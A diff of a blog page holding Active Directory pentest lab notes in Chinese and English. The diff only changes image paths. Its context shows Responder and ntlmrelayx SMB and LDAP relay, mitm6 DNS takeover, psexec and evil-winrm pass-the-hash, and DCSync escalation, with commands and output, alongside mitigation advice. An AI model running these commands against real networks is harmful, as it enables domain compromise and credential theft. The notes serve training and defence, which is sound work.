 <li>hash are not being captured, but ther’re actually being relayed</li>
 </ul>
-<p><img src="img/ADInitial_Untitled_12.png" alt="Untitled"></p>
+<p><img src="/img/ADInitial_Untitled_12.png" alt="Untitled"></p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">**<span class="built_in">sudo</span> responder –I eth0 -dwP**</span><br></pre></td></tr></table></figure>
-<p><img src="img/ADInitial_Untitled_13.png" alt="Untitled"></p>
+<p><img src="/img/ADInitial_Untitled_13.png" alt="Untitled"></p>
 <p>最後，將啟動 ntlmrelayx 並等待事件發生</p>
 <ul>
 <li>set that up with target file that’s going to be the host that we identified with SMB signing disable or not enforced, then we’re going to have that run</li>
@@ -1344,7 +1344,7 @@
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **ntlmrelayx.py -tf target.txt -smb2support**</span><br><span class="line">Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Protocol Client SMB loaded..</span><br><span class="line">[*] Protocol Client SMTP loaded..</span><br><span class="line">/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support <span class="keyword">for</span> it is now deprecated <span class="keyword">in</span> cryptography, and will be removed <span class="keyword">in</span> the next release.</span><br><span class="line">[*] Protocol Client MSSQL loaded..</span><br><span class="line">[*] Protocol Client HTTPS loaded..</span><br><span class="line">[*] Protocol Client HTTP loaded..</span><br><span class="line">[*] Protocol Client IMAPS loaded..</span><br><span class="line">[*] Protocol Client IMAP loaded..</span><br><span class="line">[*] Protocol Client LDAP loaded..</span><br><span class="line">[*] Protocol Client LDAPS loaded..</span><br><span class="line">[*] Running <span class="keyword">in</span> relay mode to hosts <span class="keyword">in</span> targetfile</span><br><span class="line">[*] Setting up SMB Server</span><br><span class="line">[*] Setting up HTTP Server</span><br><span class="line"></span><br><span class="line">[*] Servers started, waiting <span class="keyword">for</span> connections</span><br><span class="line">....</span><br></pre></td></tr></table></figure>
 <p>need to an event to occur, point this directly to ourselves and that relay is going to happen</p>
 <p>在受害機上開啟檔案總管並輸入\192.168.19.130連線到攻擊者</p>
-<p><img src="img/ADInitial_Untitled_14.png" alt="Untitled"></p>
+<p><img src="/img/ADInitial_Untitled_14.png" alt="Untitled"></p>
 <p>Attack succeeded or this authentication succeeded</p>
 <ul>
 <li>dumps out for us the hashs of SAM</li>
@@ -1369,7 +1369,7 @@
 <p><strong>除了轉儲本地 SAM 雜湊值之外，還可以透過 SMB 中繼攻擊獲得其他樂趣。例如，我們可以獲得機器上的 shell 存取權限：</strong></p>
 <p>get an interactive shell as opposed to just getting that SAM dump</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ntlmrelayx.py –tf targets.txt –smb2support -i</span><br></pre></td></tr></table></figure>
-<p><img src="img/ADInitial_Untitled_15.png" alt="Untitled"></p>
+<p><img src="/img/ADInitial_Untitled_15.png" alt="Untitled"></p>
 <ul>
 <li>thorugh the file system - machine、shares..<ul>
 <li>do a lot different things here via the shell that we have created</li>
@@ -1377,10 +1377,10 @@
 </li>
 </ul>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc 127.0.0.1 11000</span><br></pre></td></tr></table></figure>
-<p><img src="img/ADInitial_Untitled_16.png" alt="Untitled"></p>
+<p><img src="/img/ADInitial_Untitled_16.png" alt="Untitled"></p>
 <p><strong>可以遠端運行命令。在此範例中，我們將在中繼攻擊期間簡單地執行“whoami”。</strong></p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ntlmrelayx –tf targets.txt –smb2support –c “<span class="built_in">whoami</span>”</span><br></pre></td></tr></table></figure>
-<p><img src="img/ADInitial_Untitled_17.png" alt="Untitled"></p>
+<p><img src="/img/ADInitial_Untitled_17.png" alt="Untitled"></p>
 <p>If you get that SAM dump you’re gonna be fine anyway</p>
 <h3 id="如何緩解-SMB-中繼攻擊？"><a href="#如何緩解-SMB-中繼攻擊？" class="headerlink" title="如何緩解 SMB 中繼攻擊？"></a><strong>如何緩解 SMB 中繼攻擊？</strong></h3><p>Mitigation Strategies:</p>
 <ul>
@@ -1419,11 +1419,11 @@
 <li>Microsoft 網路伺服器：對通訊進行數位簽章（始終）</li>
 <li>Microsoft 網路伺服器：對通訊進行數位簽章（如果客戶同意）</li>
 </ul>
-<p><img src="img/ADInitial_Untitled_18.png" alt="Untitled"></p>
+<p><img src="/img/ADInitial_Untitled_18.png" alt="Untitled"></p>
 <p><strong>確認我們的緩解措施</strong></p>
 <p>我們可以透過在 cmd.exe 中執行以下命令並收到兩項返回的<strong>「0x1」</strong>來確認我們已緩解 SMB 中繼攻擊：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">reg query HKLM\System\CurrentControlSet\Services\LanManServer\Parameters | findstr /I securitysignature</span><br></pre></td></tr></table></figure>
-<p><img src="img/ADInitial_Untitled_19.png" alt="Untitled"></p>
+<p><img src="/img/ADInitial_Untitled_19.png" alt="Untitled"></p>
 <p>替代防禦</p>
 <p>如果公司無法在所有裝置上強制執行 SMB 簽名，最好的做法是：</p>
 <ul>
@@ -1461,9 +1461,9 @@
 <p>utilize in similar fashion and still get a shell on</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **psexec.py MARVEL/fcastle:<span class="string">&#x27;Password1&#x27;</span>@192.168.19.149**</span><br><span class="line">Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Requesting shares on 192.168.19.149.....</span><br><span class="line">[*] Found writable share ADMIN$</span><br><span class="line">[*] Uploading file RgNLATKC.exe</span><br><span class="line">[*] Opening SVCManager on 192.168.19.149.....</span><br><span class="line">[*] Creating service yjGh on 192.168.19.149.....</span><br><span class="line">[*] Starting service yjGh.....</span><br><span class="line">[!] Press <span class="built_in">help</span> <span class="keyword">for</span> extra shell commands</span><br><span class="line">Microsoft Windows [Version 10.0.19045.4046]</span><br><span class="line">(c) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;</span><br><span class="line"></span><br><span class="line">-----</span><br><span class="line">**psexec.py marvel.local/fcastle:<span class="string">&#x27;Password1&#x27;</span>@IP</span><br><span class="line">psexec.py administrator@IP -hashes sf3t32t4t3tg4434tvvfehva34342...** <span class="comment">#not need to crack hash, then can utilize this to elevate further or get into this machine just using hash</span></span><br></pre></td></tr></table></figure>
 <p>另一種方法，指令輸入後再輸入目標機器密碼</p>
-<p><img src="img/ADInitial_Untitled_20.png" alt="Untitled"></p>
+<p><img src="/img/ADInitial_Untitled_20.png" alt="Untitled"></p>
 <p>或是貼上hash</p>
-<p><img src="img/ADInitial_Untitled_21.png" alt="Untitled"></p>
+<p><img src="/img/ADInitial_Untitled_21.png" alt="Untitled"></p>
 <p>如果psexec不動作或被防毒擋下</p>
 <p>執行如下命令取得目標系統192.168.19.149的shell：</p>
 <p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/246440.html">https://www.freebuf.com/articles/246440.html</a></p>
@@ -1488,7 +1488,7 @@
 <li>這是由使用者重新啟動其端點或登入以及其他操作觸發的</li>
 </ul>
 <p>Windows 喜歡 IPv6 而不是 IPv4。如果網路中尚未使用 IPv6，這使我們能夠使用 mitm6 執行 DNS 接管。執行此攻擊時，還可以透過欺騙 WPAD 位置並要求身份驗證以使用我們的惡意代理，使電腦帳戶和使用者透過 HTTP 向我們進行身份驗證。</p>
-<p><img src="img/ADInitial_Untitled_22.png" alt="Untitled"></p>
+<p><img src="/img/ADInitial_Untitled_22.png" alt="Untitled"></p>
 <p><strong>There are three parts to this attack:</strong></p>
 <ol>
 <li>IPv6 DNS Spoofing</li>
@@ -1511,12 +1511,12 @@
 <p>當我們重新啟動機器時，<strong>重新啟動的機器將觸發事件</strong>，該事件將傳遞給我們。我們可以使用該機器登入網域控制器，它不必是管理員或其他任何東西，我們可以獲取信息，大量資訊只是我們可以使用該機器來創建另一台機器</p>
 <p>等待某人登入網路或在某個地方使用他們的憑證，它會以 NTLM 的形式到達我們，就像回應程式、SMB 中繼一樣</p>
 <p>再來看到執行命令的那個目錄下新增了一個lootme目錄，打開可以看到所有捕捉到的資訊</p>
-<p><img src="img/ADInitial_Untitled_23.png" alt="Untitled"></p>
+<p><img src="/img/ADInitial_Untitled_23.png" alt="Untitled"></p>
 <p>可以通過查看目錄中的文件得知收集到的資訊</p>
-<p><img src="img/ADInitial_Untitled_24.png" alt="Untitled"></p>
+<p><img src="/img/ADInitial_Untitled_24.png" alt="Untitled"></p>
 <p>開啟THEPUN…機器，<strong>登入MARVEL\administrator - Akali@</strong>，同時回到kali看到<strong>ntlmrelayx.py的回傳資訊</strong></p>
 <p>然後它將開始為我們設定一個<strong>存取控制列表</strong>，然後它將為我們<strong>建立一個新用戶。</strong></p>
-<p><img src="img/ADInitial_Untitled_25.png" alt="Untitled"></p>
+<p><img src="/img/ADInitial_Untitled_25.png" alt="Untitled"></p>
 <ul>
 <li>user - rkxJHDREXh</li>
 <li>password - 3ng-\mbLt\,pf&amp;`<ul>
@@ -1524,17 +1524,17 @@
 </ul>
 </li>
 </ul>
-<p><img src="img/ADInitial_Untitled_26.png" alt="Untitled"></p>
+<p><img src="/img/ADInitial_Untitled_26.png" alt="Untitled"></p>
 <p>可以到Domain Control - Winser2022那台機器查看新增進網域得用戶</p>
-<p><img src="img/ADInitial_Untitled_27.png" alt="Untitled"></p>
+<p><img src="/img/ADInitial_Untitled_27.png" alt="Untitled"></p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">**ntlmrelayx.py -6 -t ldaps://192.168.19.140 -wh fakewpad.marvel.local**</span><br><span class="line">....</span><br><span class="line">TypeName: &#123;<span class="string">&#x27;ACCESS_ALLOWED_ACE&#x27;</span>&#125;</span><br><span class="line">[*] User privileges found: Adding user to a privileged group (Enterprise Admins)</span><br><span class="line">[*] User privileges found: Modifying domain ACL</span><br><span class="line">[*] Attempting to create user <span class="keyword">in</span>: CN=Users,DC=MARVEL,DC=<span class="built_in">local</span></span><br><span class="line">[*] Adding new user with username: **rkxJHDREXh** and password: **3ng-\mbLt\,pf&amp;`** result: OK</span><br><span class="line">[*] Querying domain security descriptor</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>LDAP 中繼攻擊利用 NTLM 驗證，其中執行 NTLM 驗證請求，攻擊者會擷取憑證並將其中繼到網域控制器，並利用此攻擊 LDAP。</p>
 <p>預設情況下，如果沒有 LDAP 簽章和通道綁定</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **ntlmrelayx.py -6 -t ldaps://192.168.19.140 -wh fakewpad.marvel.local --escalate-user rkxJHDREXh**</span><br><span class="line">Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Protocol Client SMB loaded..</span><br><span class="line">[*] Protocol Client SMTP loaded..</span><br><span class="line">/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support <span class="keyword">for</span> it is now deprecated <span class="keyword">in</span> cryptography, and will be removed <span class="keyword">in</span> the next release.</span><br><span class="line">[*] Protocol Client MSSQL loaded..</span><br><span class="line">[*] Protocol Client HTTPS loaded..</span><br><span class="line">[*] Protocol Client HTTP loaded..</span><br><span class="line">[*] Protocol Client IMAPS loaded..</span><br><span class="line">[*] Protocol Client IMAP loaded..</span><br><span class="line">[*] Protocol Client LDAP loaded..</span><br><span class="line">[*] Protocol Client LDAPS loaded..</span><br><span class="line">[*] Running <span class="keyword">in</span> relay mode to single host</span><br><span class="line">[*] Setting up SMB Server</span><br><span class="line"></span><br><span class="line">[*] Setting up HTTP Server</span><br><span class="line">[*] Servers started, waiting <span class="keyword">for</span> connections</span><br></pre></td></tr></table></figure>
 <p>開啟在THEPUNISHER的MARVEL\administrator管理員PC，開啟網頁回連攻擊者IP，輸入網域管理員帳密</p>
-<p><img src="img/ADInitial_Untitled_28.png" alt="Untitled"></p>
+<p><img src="/img/ADInitial_Untitled_28.png" alt="Untitled"></p>
 <p>回到攻擊機會看到請求憑證且網域管理員成功提交憑證的情況。ntlmrelayx.py接收憑證並將其轉送到192.168.19.140上的網域控制站</p>
-<p><img src="img/ADInitial_Untitled_29.png" alt="Untitled"></p>
+<p><img src="/img/ADInitial_Untitled_29.png" alt="Untitled"></p>
 <p>成功授予了使用者rkxJHDREXh DCSync權限，這權限可用於轉儲網域雜湊</p>
 <p><a target="_blank" rel="noopener" href="https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DCSync">DCSync</a></p>
 <p>能夠用來匯出網域內所有使用者的hash</p>
@@ -1552,7 +1552,7 @@
 <p>網域控制站在5985 port執行WinRM服務，可以與雜湊值一同使用Evil-WinRM進行驗證</p>
 <p>WinRM是WEB服務管理於微軟的Microsoft Windows中的實現，它允許處於一個共同網絡內的Microsoft Windows計算機彼此之間互相訪問和交換信息。在一台機器啟用WinRM後，另一台機器就能通過Windows PowerShell對開啟WinRM的機器進行遠程管理</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **evil-winrm -i 192.168.19.140 -u <span class="string">&#x27;Administrator&#x27;</span> -H <span class="string">&#x27;9d45c944752dc08356c32926dbd53bb1&#x27;</span>**</span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.5</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="keyword">function</span> is unimplemented on this machine                                                                                                                     </span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">***Evil-WinRM* PS C:\Users\Administrator\Documents&gt;**</span><br></pre></td></tr></table></figure>
-<p><img src="img/ADInitial_Untitled_30.png" alt="Untitled"></p>
+<p><img src="/img/ADInitial_Untitled_30.png" alt="Untitled"></p>
 <p>成功遠程登入到網域管理員帳號</p>
 <h2 id="IPv6-Attack-Defenses"><a href="#IPv6-Attack-Defenses" class="headerlink" title="IPv6 Attack Defenses"></a><strong>IPv6 Attack Defenses</strong></h2><h3 id="Mitigation-Strategies"><a href="#Mitigation-Strategies" class="headerlink" title="Mitigation Strategies:"></a>Mitigation Strategies:</h3><ul>
 <li>IPv6 poisoning abuses the fact that Windows queries for an IPv6 address even in IPv4-only environments.</li>
@@ -1574,7 +1574,7 @@
 <p><strong>C。定期安全審核：</strong></p>
 <p>對網路基礎架構、系統和應用程式進行定期安全審核可以幫助在攻擊者利用漏洞之前識別和解決漏洞。組織還應該保持其網路設備和軟體修補並保持最新狀態。</p>
 <h2 id="Passback-Attacks"><a href="#Passback-Attacks" class="headerlink" title="Passback Attacks"></a><strong>Passback Attacks</strong></h2><p>A Pen Tester’s Guide to Printer Hacking - <a target="_blank" rel="noopener" href="https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack/">https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack/</a></p>
-<h2 id="Initial-Internal-Attack-Strategy"><a href="#Initial-Internal-Attack-Strategy" class="headerlink" title="Initial Internal Attack Strategy"></a><strong>Initial Internal Attack Strategy</strong></h2><p><img src="img/ADInitial_Untitled_31.png" alt="Untitled"></p>
+<h2 id="Initial-Internal-Attack-Strategy"><a href="#Initial-Internal-Attack-Strategy" class="headerlink" title="Initial Internal Attack Strategy"></a><strong>Initial Internal Attack Strategy</strong></h2><p><img src="/img/ADInitial_Untitled_31.png" alt="Untitled"></p>
 <ul>
 <li>Begin day with mitm6 or Responder</li>
 <li>Run scans to generate traffic</li>
@@ -1745,7 +1745,7 @@
 <li><p>Trusts</p>
 <ul>
 <li><p>Trusts provide a mechanism for users to gain access to resources in another domain</p>
-<p>  <img src="img/AD_Untitled.png" alt="Untitled"></p>
+<p>  <img src="/img/AD_Untitled.png" alt="Untitled"></p>
 </li>
 <li><p>All domains in a forest trust all other domains in the forest</p>
 </li>
@@ -1806,7 +1806,7 @@
 </tbody>
 </table>
 </div>
-<p><img src="img/AD_Untitled_1.png" alt="Untitled"></p>
+<p><img src="/img/AD_Untitled_1.png" alt="Untitled"></p>
 <div class="table-container">
 <table>
 <thead>
